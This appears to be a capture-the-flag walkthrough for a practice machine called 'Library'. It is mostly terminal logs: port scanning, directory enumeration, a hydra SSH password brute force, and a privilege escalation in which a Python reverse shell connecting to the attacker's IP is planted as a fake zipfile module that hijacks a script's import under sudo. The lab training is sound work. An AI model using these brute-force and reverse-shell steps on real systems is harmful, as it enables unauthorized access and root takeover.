'''
┌──(xnv㉿Kali)-[~]
└─$ nmap -A 10.10.200.31                                                                
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-26 08:17 EST
Nmap scan report for 10.10.200.31
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
'''

'''
┌──(xnv㉿Kali)-[~]
└─$ gobuster dir -w directory-list-2.3-small.txt -u http://library.thm/ -t 100 -x txt,html,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://library.thm/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2021/11/26 10:45:20 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://library.thm/images/]
/index.html           (Status: 200) [Size: 5439]                                
/robots.txt           (Status: 200) [Size: 33]                                  
'''

'''
http://library.thm/robots.txt
agent: rockyou 
Disallow: /
'''

'''┌──(xnv㉿Kali)-[~]
└─$ hydra -l meliodas -P rockyou.txt 10.10.200.31 ssh  

[22][ssh] host: 10.10.200.31   login: meliodas   password: iloveyou1
'''

'''
meliodas@ubuntu:~$ cat user.txt 
***************************
'''

'''
No arquivo bak.py , ele tem o import zipfile

então cria um arquivo chamado zipfile.py e coloca o reverse


import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.9.6.80",4455));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
'''

'''
meliodas@ubuntu:~$ sudo python3 /home/meliodas/bak.py
'''

'''
# cat /root/root.txt
******************************